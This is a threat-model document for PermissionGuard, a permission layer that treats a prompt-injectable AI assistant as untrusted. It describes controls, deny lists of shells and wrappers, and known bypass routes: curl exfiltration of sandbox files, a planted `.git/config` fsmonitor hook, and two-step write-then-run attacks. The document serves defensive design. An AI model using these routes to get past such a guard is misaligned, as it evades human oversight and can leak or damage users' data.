# Threat model

## What PermissionGuard is for

An AI assistant is connected to tools that can touch a real machine. The assistant is
**not trusted**: it can be confused, or it can be steered by hostile text it reads
(prompt injection in a file, web page or tool result). PermissionGuard sits between
the assistant and the tools so that a misbehaving assistant can do limited damage and
every attempt leaves evidence.

## Attacker model

| Attacker | Capabilities | In scope |
|---|---|---|
| Prompt-injected / misbehaving assistant | Can send any `ActionRequest`: any path, any command string, any params, in any order, repeatedly. Can read/write files inside the sandbox once allowed. | **Yes** |
| Assistant plus a careless approver | Same, and the human says "yes" to everything they are asked. | **Yes** (the guard must hold for everything that is denied outright; see "what approval does not cover") |
| Local attacker with write access to the project directory | Can edit the policy, the code, or the audit file. | **No** (only tamper *evidence* for the audit log) |
| Attacker with code execution as the same OS user | Can bypass anything in-process. | **No** |
| Malicious human operator | Approves things on purpose. | **No** |

## What is enforced

| Risk | Control | Where | Tested in |
|---|---|---|---|
| Path traversal (`..`, absolute paths) | Lexical normalisation, then `resolve()` and containment check against the sandbox root | `policy.py` | `test_policy.py`, `test_bypass_attempts.py` |
| Symlink escape | Escaping links are denied by the policy; links anywhere in a path are denied outright | `policy.py` | `test_policy.py` |
| Symlink swapped after the check (TOCTOU) | Tools open every path component with `O_NOFOLLOW` relative to a directory fd; a swapped-in symlink makes the open fail | `tools.py` | `test_tools.py`, `test_bypass_attempts.py` |
| Special files (FIFOs, devices) | `fstat` must report a regular file; `O_NONBLOCK` so opening a FIFO cannot hang | `tools.py` | `test_tools.py` |
| Obfuscated commands (`r''m`, `\rm`, `/bin/rm`, `RM`) | Commands are parsed into argv first; the program name is normalised; path-qualified programs are refused | `commands.py` | `test_commands.py`, `test_bypass_attempts.py` |
| Chaining and injection (`;`, `&&`, pipes, redirects, `$(...)`, backticks, newlines) | Anything needing a shell is denied; tools run without a shell anyway | `commands.py`, `tools.py` | same |
| Unknown or dangerous programs | Allowlist-first: unknown program = deny. Shells, wrappers (`env`, `xargs`, `timeout`...), privilege tools, disk tools, `ln`, `chmod` are explicitly denied with a reason | `default.yaml` | `test_policy.py` |
| Dangerous options on allowed programs | Per-program option rules (`rm -r`, `python -c/-m`, `curl -K`, `wget -e`); `git` limited to read-only subcommands | `default.yaml` | `test_policy.py` |
| Path arguments that leave the sandbox | Every path-like argument (including `--opt=value` and glued `-o/path`) must stay inside; URLs limited to http(s) | `commands.py` | `test_policy.py` |
| Resource abuse | Read/write size caps, command timeout (whole process group killed), output cap, command length cap | `tools.py`, `policy.py` | `test_tools.py` |
| Secret leakage to child processes | Children get a scrubbed environment (`PATH` with absolute entries only, `HOME`, `LANG`) and no stdin | `tools.py` | `test_tools.py` |
| Approving blind | The approval prompt shows the resolved absolute path, the parsed argv, and a content preview for writes | `approval.py`, `policy.py` | `test_approval.py`, `test_guard.py` |
| Bad policy file | Unknown keys, bad verdicts, wrong types refuse to load; an empty policy denies everything | `policy.py` | `test_policy_config.py` |
| Crashes turning into "allow" | Policy exception = deny; approver exception or closed stdin = deny; tool exceptions are caught and logged | `guard.py`, `approval.py` | `test_guard.py` |
| Actions without a record | The decision is written **before** the tool runs; if the audit write fails the tool does not run | `guard.py` | `test_guard.py` |
| Silent log edits | Hash chain over every entry; `python -m permission_guard verify` detects modification, deletion, insertion and reordering | `audit.py` | `test_audit.py` |

## Known limitations

Each of these has an `xfail(strict=True)` test in `tests/test_bypass_attempts.py`. If one
is ever fixed, that test starts failing and must be turned into a normal test.

1. **Approved interpreters run arbitrary code.** `python script.py` is allowed after
   approval, and the script's content is not inspected. The human prompt is the only
   barrier. Mitigation today: inline code (`-c`, `-m`) is denied and the prompt shows argv.
2. **Two-step attacks.** `write_file run.py ...` (approved) followed by `python run.py`
   (approved) can do what neither step looks like alone. Each step is judged on its own.
3. **Exfiltration through allowed network programs.** `curl -d @file https://host` sends
   sandbox data out. `curl`/`wget` always require approval, but the policy does not model data flow.
4. **Hostile repository config.** A `.git/config` planted in the sandbox can make an
   allowed `git status` run commands (`core.fsmonitor`). `git` is limited to read-only
   subcommands but its configuration is not sanitised.
5. **Audit log: tail truncation.** Removing the newest entries leaves a valid chain. Store
   `AuditLog.last_hash()` somewhere the attacker cannot write (another host, a ticket, a
   signed commit) and compare it.
6. **Audit log: full rewrite.** Someone who can rewrite the whole file can recompute the
   entire chain. The chain gives tamper *evidence* against partial edits, not protection
   against a determined local attacker. Signing entries with a key held elsewhere would fix this.
7. **Session approvals are per `(action, target)`**, so approving `write_file notes.txt`
   once covers later writes of different content to the same file.
8. **Hard links** that already exist inside the sandbox are indistinguishable from files.
   The tools cannot create links (`ln` is denied), but pre-existing ones are not detected.
9. **POSIX only.** The sandbox relies on `openat`, `O_NOFOLLOW` and process groups
   (macOS and Linux). Windows is not supported.
10. **Single user, single machine.** Concurrent writers are serialised with `flock`, which
    does not protect against writers on a network filesystem that ignores locks.

## Out of scope for this version

Authentication of who is approving, network-level egress control, containers or
seccomp-level isolation, rate limiting, and policy signing. The sandbox is a
*policy-level* boundary enforced in user space, not an OS-level jail. For hostile
workloads, run the guard inside a container or VM as well.
